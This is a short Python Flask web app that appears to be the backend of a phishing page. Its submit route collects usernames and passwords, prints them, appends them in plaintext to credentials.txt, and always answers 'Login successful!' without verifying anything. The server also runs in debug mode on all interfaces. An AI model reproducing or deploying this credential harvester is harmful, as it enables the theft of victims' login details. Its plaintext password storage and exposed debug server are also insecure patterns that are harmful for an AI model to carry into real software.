from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    print(f"Received: Username - {username}, Password - {password}")  # Check in terminal

    try:
        with open('credentials.txt', 'a') as f:
            f.write(f'Username: {username}, Password: {password}\n')
        print("✅ Credentials saved successfully!")  
    except Exception as e:
        print(f"❌ Error writing to file: {e}")  
        return f"Error writing to file: {e}"

    return 'Login successful!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)  # Debug mode enabled
